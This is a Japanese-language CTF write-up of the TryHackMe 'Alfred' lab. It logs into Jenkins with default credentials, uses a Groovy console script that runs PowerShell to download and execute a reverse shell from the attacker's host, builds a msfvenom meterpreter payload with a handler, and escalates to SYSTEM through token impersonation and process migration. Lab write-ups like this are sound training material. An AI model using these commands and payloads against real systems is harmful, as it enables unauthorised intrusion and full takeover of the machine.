# Alfred CTF

https://tryhackme.com/room/alfred

## Enumeration

### ポートスキャン

```shell
root@ip-10-10-0-63:~# nmap -A -p80,3389,8080 10.10.53.218
Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-04 01:21 BST
Nmap scan report for 10.10.53.218
Host is up (0.00048s latency).

PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Site doesn't have a title (text/html).
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
MAC Address: 02:F7:26:B2:84:E1 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows 8.1 R1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 or 2008 Beta 3 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms 10.10.53.218

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.77 seconds
```

### gobuster

何も出なかった。

### Jenkins

Web 検索で、Jenkins インストール時のデフォルトユーザー名が admin であることは分かった。  
admin/admin でログインできた。

## ScriptConsole

http://10.10.53.218:8080/script

groovy script  
リバースシェル shell.ps1 を HTTP サーバーでホストして、Web コンソール上で Run を実行。

```
def command = ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "iex (New-Object Net.WebClient).DownloadString('http://10.2.22.182:8000/shell.ps1');", "shell.ps1"]
def process = new ProcessBuilder(command).redirectErrorStream(true).start()
def output = process.inputStream.text
println output
```

リバースシェルを取得できた。

```shell
$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.2.22.182] from (UNKNOWN) [10.10.53.218] 49240
whoami
alfred\bruce
```

```shell
type c:\\Users\\bruce\\Desktop\\user.txt
79............................
```

ユーザーフラグゲット。

## Meterpreter 切り替え

meterpreter リバースシェル作成

```shell
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.2.22.182 LPORT=8089 -f exe -o metershell.exe
```

metershell.exe をターゲットにダウンロードし、ハンドラーをスタート。

```shell
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.2.22.182
LHOST => 10.2.22.182
msf6 exploit(multi/handler) > set LPORT 8089
LPORT => 8089
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.2.22.182:8089
```

ターゲット上で metershell.exe を実行したら meterpreter 取得成功。

```shell
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.2.22.182:8089
[*] Sending stage (176198 bytes) to 10.10.53.218
[*] Meterpreter session 2 opened (10.2.22.182:8089 -> 10.10.53.218:49260) at 2025-04-03 21:12:10 -0400

meterpreter >
```

## 権限昇格

権限

```shell
C:\Program Files (x86)\Jenkins>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege         Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

SeDebugPrivilege, SeImpersonatePrivilege が有効になっていることに注目。

incognito モジュールをロード。

```shell
meterpreter > load incognito
Loading extension incognito...Success.
```

トークンを列挙

```shell
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
No tokens available
```

BUILTIN\Administrators が使用可能。

トークンを偽装。

```shell
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

現状では機密情報にアクセスできない。これは、Windows が偽装トークンではなく、プロセスのプライマリ トークンを使用して、プロセスが実行できる操作と実行できない操作を判断するため。

```shell
meterpreter > dir C:\\Windows\\System32\\config
[-] Send timed out. Timeout currently 15 seconds, you can configure this with sessions --interact <id> --timeout <value>
```

services.exe プロセスに移行するため、ps コマンドで services.exe の PID を見つける。

```shell
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
```

移行。

```shell
meterpreter > migrate 668
[*] Migrating from 1432 to 668...
[*] Migration completed successfully.
```

```shell
C:\Windows\system32>type C:\Windows\System32\config\root.txt
type C:\Windows\System32\config\root.txt
df................................
```

ルートフラグゲット

## 振り返り

- Jenkins の ScriptConsole は 昔、Youtube のビデオで見たことあるが、自分で攻撃に使ったのは初めて。
- NT AUTHORITY\SYSTEM に昇格してもアクセス拒否されるというパターンは初めてで、services.exe プロセスに移行するのはとても勉強になった。

## Tags

#tags:Windows #tags:Jenkins
